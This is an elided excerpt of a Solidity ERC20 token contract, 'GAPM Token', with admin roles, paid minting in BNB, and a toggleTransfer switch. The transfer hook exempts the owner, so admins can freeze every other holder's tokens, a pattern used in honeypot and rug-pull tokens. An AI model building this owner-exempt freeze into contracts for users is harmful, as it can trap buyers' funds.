...
abstract contract Ownable is Context {
    ...
    modifier admin() {
        require(addressAdmin[msg.sender] == true || owner() == _msgSender(), "You do not have auth to do this");
        _;
    }
...
contract GAPMToken is ERC20, Ownable {
    uint256 public MAX_SUPPLY = 100000000 * 10 ** 18;
    uint256 public MINT_PRICE = 1 ether; // BSC BNB has the same decimals as Ether
    uint256 public MIN_MINT = 1 * 10 ** 18;
    uint256 public MAX_MINT = 1000000 * 10 ** 18;
    bool public isMintingEnabled = true;
    bool public isTransferEnabled = true;

    constructor(address _initialOwner , address _firstAdmin) ERC20("GAPM Token", "GAPM") {
    ...
    function mint(
        ...
        require(msg.value == (_amount * MINT_PRICE) / 10 ** 18, "BNB value sent is not exact value");
        _mint(_to, _amount);
    }
    ...
    // Enabled transfer
    function toggleTransfer() external admin {
    ...
    function _beforeTokenTransfer(
        ...
        if (from != address(0) && from != owner() && to != address(this)) {
            require(isTransferEnabled, "Token transfer restricted");
        }
    }
}